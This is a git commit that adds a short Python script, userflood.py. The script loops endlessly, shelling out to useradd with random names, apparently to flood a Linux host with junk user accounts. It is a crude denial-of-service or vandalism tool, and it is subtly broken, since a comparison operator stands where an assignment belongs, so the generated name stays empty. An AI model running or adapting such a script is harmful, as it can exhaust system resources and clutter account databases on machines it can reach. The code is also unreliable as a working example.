bfd4f9a73d491bedc4ba8ad7bf6edce701534f39
Benji <97198967+BenPI88@users.noreply.github.com>
2023-02-19 10:58:12 -0600

    Create userflood.py

---
+++ userflood.py
@@ -0,0 +1,10 @@
+import os
+import string
+import random
+while True:
+  rndstr = ""
+  i = 0
+  while not i == 10:
+    i += 1
+    rndstr == rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase) - 1)]
+  os.system("useradd -p " + rndstr + " " + rndstr)
